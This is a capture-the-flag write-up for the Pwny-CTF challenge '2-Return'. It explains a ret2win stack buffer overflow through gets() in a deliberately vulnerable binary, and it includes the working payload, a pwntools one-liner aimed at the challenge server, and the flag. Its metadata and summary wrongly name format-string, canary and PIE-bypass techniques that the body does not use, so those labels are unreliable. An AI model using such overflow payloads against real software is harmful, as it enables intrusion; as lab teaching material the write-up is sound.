---
title: "2-Return"
ctf: "Pwny-CTF"
category: "pwn"
difficulty: "Not specified"
points: 200
techniques: ["format-string", "ret2win", "stack-canary", "pie-bypass", "nx-bypass"]
tools: ["pwntools", "checksec", "python"]
keywords: ["2-Return", "Pwny-CTF", "pwn", "format-string", "ret2win", "stack-canary", "pie-bypass", "nx-bypass", "pwntools", "checksec", "python", "elf", "canary", "pie", "stack"]
status: "solved"
has_script: true
source: "Pwny-CTF/CHALLENGES/Pwn/2-Return/notes.md"
---

# 2-Return (Pwny-CTF, pwn)

## Summary
Challenge **2-Return** from the Pwny-CTF CTF, pwn category. Main technique: format-string. A "win" function (print_flag/system) + overflow + No PIE -> ret2win: overwrite the return address with its fixed address.

## Statement and artefacts
Can you pwn this problem? Look at the challenge.c and pwn writeup for hints!

Code (challenge.c):
  void print_flag() { __asm__("sub $0x8,%rsp"); system("/bin/cat ./flag.txt"); }  // "win" function
  int main() {
      char name[32];
      gets(name);                 //overflow
      printf("Nice to meet you, %s.\n", name);
  }
  // Objective: overwrite the return address of main with the address of print_flag.

Build: gcc -O0 -fno-stack-protector -no-pie (No PIE = fixed addresses, no canary, NX active).

**Provided files / artifacts:**
- `Dockerfile (file, 629 B)`
- `Makefile (file, 127 B)`
- `challenge (file, 18.7 KB)`
- `challenge_patched (file, 18.7 KB)`

## Recognition signals
- Signal: gets overflows name -> we overwrite the return address of main (after name + saved RBP) with the address of print_flag.
- If we observe a `ret`, the CPU jumps there, think about the flag.
- Signal: Stack alignment: system/printf uses movaps (requires rsp%16==0). If crash just after the jump, add a ret gadget before the target address (here avoided by sub $8).

## Resolution method
1. **Offset** = `name[32]` + `saved RBP` (8) = **40** (confirmed with `cyclic(200)` → `cyclic_find(...)`).
2. **Address of print_flag**: binary **PIE No** → fixed. `elf.sym['print_flag']` (or `nm challenge | grep print_flag`).
3. Payload = `b"A"*40 + p64(elf.sym['print_flag'])`. `sla(b"name?", payload)`.
4. `sub $0x8,%rsp` in print_flag fixes **16 byte alignment** (movaps/system) → direct jump OK, no need for `ret` gadget.

1. **Flaw**

```c
void print_flag(){ __asm__("sub $0x8,%rsp"); system("/bin/cat ./flag.txt"); }  // win
int main(){ char name[32]; gets(name); ... }   // overflow, no canary
```
`gets` overflows `name` → we overwrite the **return address of main** (after name + saved RBP) with the address of `print_flag`. At `ret`, the CPU jumps to it → flag.

## Discarded approaches
```bash
python3 -c 'from pwn import *; e=ELF("./challenge",checksec=False); io=remote("chal.sigpwny.com",1389); io.sendlineafter(b"name?", b"A"*40+p64(e.sym["print_flag"])); print(io.recvall(timeout=2))'
nm challenge | grep print_flag          # fixed address (PIE number)
```

## Solve script
Script path: [scripts/pwny.py](scripts/pwny.py)

## Flag
sigpwny{the_stack_is_the_control_flow}

## Lessons and reusable patterns
- A "win" function (print_flag/system) + overflow + No PIE -> ret2win: overwrite the return address with its fixed address.
- Classic offset = buffer_size + 8 (saved RBP) before the return address. cyclic/cyclic_find to find it without making a mistake.
- Stack alignment: system/printf uses movaps (requires rsp%16==0). If crash just after the jump, add a ret gadget before the target address (here avoided by sub $8).
